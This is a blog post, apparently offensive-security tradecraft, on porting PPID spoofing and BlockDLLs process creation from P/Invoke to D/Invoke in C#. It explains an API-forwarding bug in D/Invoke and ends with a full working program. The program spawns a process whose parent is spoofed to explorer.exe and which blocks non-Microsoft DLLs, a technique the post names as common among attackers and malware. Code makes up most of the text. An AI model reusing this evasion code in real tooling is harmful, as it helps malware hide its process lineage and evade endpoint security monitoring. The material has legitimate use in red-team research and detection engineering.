---
title: "D/Invokify PPID Spoofy & BlockDLLs"
date: 2020-12-02T10:52:26Z
draft: false
---

## Intro

The `EXTENDED_STARTUPINFO_PRESENT` process creation flag is used by the Windows CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW and CreateProcessWithTokenW APIs.  A common use case for attackers and malware is to specify a `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute (for PPID spoofing) and a `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` attribute (for BlockDLLs).

This has long been achievable in both native code and managed code (via P/Invoke), but has been somewhat elusive when it comes to [D/Invoke](https://thewover.github.io/Dynamic-Invoke/).  D/Invoke has numerous [advantages](https://youtu.be/FuxpMXTgV9s) over P/Invoke (from a .NET tradecraft perspective), so "porting" C# tooling from P/Invoke to D/Invoke is quite attractive.

## P/Invoke

Using P/Invoke, the process would go something like this:

1. Import `kernel32.dll`.

```c#
[DllImport("kernel32.dll")]
static extern bool InitializeProcThreadAttributeList(
    IntPtr lpAttributeList,
    int dwAttributeCount,
    int dwFlags,
    ref IntPtr lpSize);
```
2. Create a variable to store the required buffer size.

```c#
var lpSize = IntPtr.Zero;
```

3. Call `InitializeProcThreadAttributeList`

```c#
InitializeProcThreadAttributeList(
    IntPtr.Zero,
    2,
    0,
    ref lpSize);
```

`lpSize` will now hold the buffer size required to hold a list with `2` attributes.

```text
lpSize
0x0000000000000048
```

## D/Invoke

To do the same in D/Invoke, we:

1. Define the delegate for `InitializeProcThreadAttributeList`

```c#
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate bool InitializeProcThreadAttributeList(
    IntPtr lpAttributeList,
    int dwAttributeCount,
    int dwFlags,
    ref IntPtr lpSize);
```

2. Find the pointer to this function in `kernel32.dll`

```c#
var ptr = Generic.GetLibraryAddress("kernel32.dll", "InitializeProcThreadAttributeList");
```

3. Marshal that pointer to the delegate

```c#
var initProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(ptr,
    typeof(InitializeProcThreadAttributeList)) as InitializeProcThreadAttributeList;
```

However, if we then tried to call this function, it would crash.

![](/images/dinvoke-ppid-blockdlls/dinvoke-crash.png "D/Invoke Crash")

## The Bug

The reason for this turned out to be a bug in D/Invoke's API resolution (the same bug is also in SharpSploit), that I had previously [raised](https://github.com/TheWover/DInvoke/issues/12).  My understanding of API Sets is negligable at best - I believe the purpose is to provide some separation between API implementions for different versions of Windows and other devices (such as HoloLens and Xbox) to determine whether a particular API is a) available and b) where the implementation is.

In this case, we're looking up `InitializeProcThreadAttributeList` within `kernel32` and it's *forwarding* to a different place - the issue being, D/Invoke was never following the chain and is therefore pointing to just a string in memory rather than an actual API implementation.

![](/images/dinvoke-ppid-blockdlls/api-resolution.png "API Resolution")

[TheWover](https://twitter.com/TheRealWover) pushed a [fix](https://github.com/TheWover/DInvoke/commit/af9f86984a2ce329cb44a97459592f0b191fe252) to dev that we can now test.

[Jean-François Maes](https://twitter.com/Jean_Maes_1994) was also having a play with this fix, and suggested that I use D/Invoke's `DynamicAPIInvoke` as a more convenient way to call delegates and marshal the necessary data.

## DynamicAPIInvoke

This method invokes an arbitrary function from a DLL - we must provide the name of the DLL and function, the delegate, any parameters, and whether or not to resolve API forwards (an optional overload that I added, but one that I expect will appear in the repo soon).

```c#
var funcParms = new object[]
{
    IntPtr.Zero,
    2,
    0,
    IntPtr.Zero // this will become populated with the lpSize
};

Generic.DynamicAPIInvoke(
    "kernel32.dll",
    "InitializeProcThreadAttributeList",
    typeof(InitializeProcThreadAttributeList),
    ref funcParms,
    true // resolve API forwards
    );
```

When this method returns, the 3rd index will be populated with the `lpSize` we need.  Notice how we don't need to mess with manually specifying it as a `ref`.  If we wanted, we could also reference it as:

```c#
var lpSize = funcParms[3];
```

## Draw the Rest of the Owl

```c#
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using DInvoke.DynamicInvoke;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            var si = new Win32.STARTUPINFOEX();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
            si.StartupInfo.dwFlags = 0x00000001;

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                var funcParams = new object[] {
                    IntPtr.Zero,
                    2,
                    0,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                var lpSize = (IntPtr)funcParams[3];
                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);

                funcParams[0] = si.lpAttributeList;

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                // BlockDLLs
                if (Is64Bit)
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
                }
                else
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr(unchecked((uint)Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)));
                }

                funcParams = new object[]
                {
                    si.lpAttributeList,
                    (uint)0,
                    (IntPtr)Win32.ProcThreadAttribute.MITIGATION_POLICY,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "UpdateProcThreadAttribute",
                    typeof(UpdateProcThreadAttribute),
                    ref funcParams,
                    true);

                // PPID Spoof
                var hParent = Process.GetProcessesByName("explorer")[0].Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, hParent);

                // Start Process
                funcParams = new object[]
                {
                    si.lpAttributeList,
                    (uint)0,
                    (IntPtr)Win32.ProcThreadAttribute.PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "UpdateProcThreadAttribute",
                    typeof(UpdateProcThreadAttribute),
                    ref funcParams,
                    true);

                var pa = new Win32.SECURITY_ATTRIBUTES();
                var ta = new Win32.SECURITY_ATTRIBUTES();
                pa.nLength = Marshal.SizeOf(pa);
                ta.nLength = Marshal.SizeOf(ta);

                funcParams = new object[]
                {
                    null,
                    "notepad",
                    pa,
                    ta,
                    false,
                    Win32.CreationFlags.EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero,
                    "C:\\Windows\\System32",
                    si,
                    null
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "CreateProcessA",
                    typeof(CreateProcess),
                    ref funcParams,
                    true);

                var pi = (Win32.PROCESS_INFORMATION)funcParams[9];

                if (pi.hProcess != IntPtr.Zero)
                {
                    Console.WriteLine($"Process ID: {pi.dwProcessId}");
                }

            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
            finally
            {
                // Clean up
                var funcParams = new object[]
                {
                    si.lpAttributeList
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "DeleteProcThreadAttributeList",
                    typeof(DeleteProcThreadAttributeList),
                    ref funcParams,
                    true);
                
                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }

        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref Win32.SECURITY_ATTRIBUTES lpProcessAttributes,
            ref Win32.SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            Win32.CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref Win32.STARTUPINFOEX lpStartupInfo,
            out Win32.PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool DeleteProcThreadAttributeList(
            IntPtr lpAttributeList);
    }

    class Win32
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }

        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
        }

        [Flags]
        public enum CreationFlags : uint
        {
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
        }
    }
}
```

![](/images/dinvoke-ppid-blockdlls/notepad.png "Notepad")